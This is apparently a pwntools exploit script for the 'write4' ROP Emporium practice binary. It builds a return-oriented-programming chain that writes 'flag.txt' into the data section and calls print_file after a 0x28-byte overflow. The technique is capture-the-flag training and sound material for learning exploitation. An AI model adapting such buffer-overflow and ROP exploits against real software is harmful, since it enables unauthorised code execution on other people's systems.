#!/bin/python3

from pwn import *

elf = ELF('./write4')
libc = elf.libc

p = process(elf.path)
elf_rop = ROP(elf)

pop_r14_pop_r15_ret = elf_rop.find_gadget(['pop r14', 'pop r15', 'ret'])[0]
pop_rdi_ret = elf_rop.find_gadget(['pop rdi', 'ret'])[0]

# mov QWORD PTR [r14],r15 ; ret
useful_gadget = 0x400628

# For storing the string we need, there is probably a way to get this from the
#       elf object, but what ever this still works
data_section_base = 0x601028

chain = p64(pop_r14_pop_r15_ret)        \
    + p64(data_section_base)            \
    + b'flag.txt'                       \
    + p64(useful_gadget)                \
    + p64(pop_rdi_ret)                  \
    + p64(data_section_base)            \
    + p64(elf.plt['print_file'])
payload = b'i' * 0x28 + chain
p.sendline(payload)

p.interactive()

